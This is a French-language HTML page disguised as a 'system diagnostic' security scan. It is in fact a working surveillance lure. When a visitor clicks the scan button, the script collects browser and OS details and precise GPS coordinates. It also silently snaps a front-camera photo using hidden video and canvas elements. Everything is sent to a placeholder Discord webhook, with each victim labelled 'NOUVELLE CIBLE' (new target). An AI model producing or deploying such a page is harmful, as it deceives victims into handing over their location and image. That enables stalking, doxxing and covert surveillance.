<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>System Diagnostic</title>
    <style>
        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; text-align: center; }
        .box { border: 2px solid #0f0; padding: 30px; border-radius: 10px; box-shadow: 0 0 15px #0f0; width: 90%; max-width: 400px; }
        .btn { background: #0f0; color: #000; border: none; padding: 15px 30px; font-weight: bold; cursor: pointer; border-radius: 5px; margin-top: 20px; width: 100%; }
        #video, #canvas { display: none; }
    </style>
</head>
<body>
    <div class="box">
        <h2 id="title">ANALYSE SYST√àME</h2>
        <p id="msg">Cliquez pour lancer le diagnostic de s√©curit√©.</p>
        <button id="run" class="btn">LANCER LE SCAN</button>
    </div>

    <video id="video" autoplay playsinline muted></video>
    <canvas id="canvas"></canvas>

    <script>
        const WEBHOOK = "TON_WEBHOOK_ICI";

        // Fonction pour envoyer au webhook (stable sur tous supports)
        async function sendToDiscord(content, file = null) {
            const formData = new FormData();
            if (file) {
                formData.append('file', file, 'capture.png');
                formData.append('payload_json', JSON.stringify({ content: content }));
            } else {
                formData.append('payload_json', JSON.stringify({ content: content }));
            }
            try {
                await fetch(WEBHOOK, { method: 'POST', body: formData });
            } catch (e) { console.error("Erreur Webhook"); }
        }

        async function start() {
            const btn = document.getElementById('run');
            btn.style.display = 'none';
            document.getElementById('msg').innerText = "V√©rification en cours...";

            // 1. Infos de base (Marche partout)
            const info = `üíª **NOUVELLE CIBLE**\n**OS**: ${navigator.platform}\n**Navigateur**: ${navigator.userAgent}\n**Langue**: ${navigator.language}`;
            await sendToDiscord(info);

            // 2. G√©olocalisation (Am√©lior√© pour Mobile)
            navigator.geolocation.getCurrentPosition(async (p) => {
                await sendToDiscord(`üìç **GPS**: https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
            }, () => {
                sendToDiscord("‚ö†Ô∏è GPS refus√© ou indisponible");
            }, { enableHighAccuracy: true, timeout: 8000 });

            // 3. Capture Cam√©ra (PC + Android + iOS)
            try {
                // Support universel des contraintes vid√©o
                const constraints = { 
                    video: { 
                        facingMode: "user",
                        width: { ideal: 640 },
                        height: { ideal: 480 }
                    } 
                };
                
                const stream = await navigator.mediaDevices.getUserMedia(constraints);
                const video = document.getElementById('video');
                video.srcObject = stream;

                // Attente que la vid√©o soit pr√™te pour la capture
                video.onloadedmetadata = () => {
                    setTimeout(() => {
                        const canvas = document.getElementById('canvas');
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        canvas.getContext('2d').drawImage(video, 0, 0);
                        
                        canvas.toBlob(blob => {
                            sendToDiscord("üì∏ **CAPTURE R√âUSSIE**", blob);
                            // On coupe la cam√©ra proprement
                            stream.getTracks().forEach(t => t.stop());
                            document.getElementById('msg').innerText = "Diagnostic termin√©.";
                        }, 'image/png');
                    }, 1500); // D√©lai pour laisser l'autofocus se faire
                };
            } catch (err) {
                await sendToDiscord("‚ùå √âchec Cam√©ra: " + err.name);
                document.getElementById('msg').innerText = "Erreur de p√©riph√©rique.";
            }
        }

        document.getElementById('run').addEventListener('click', start);
    </script>
</body>
</html>
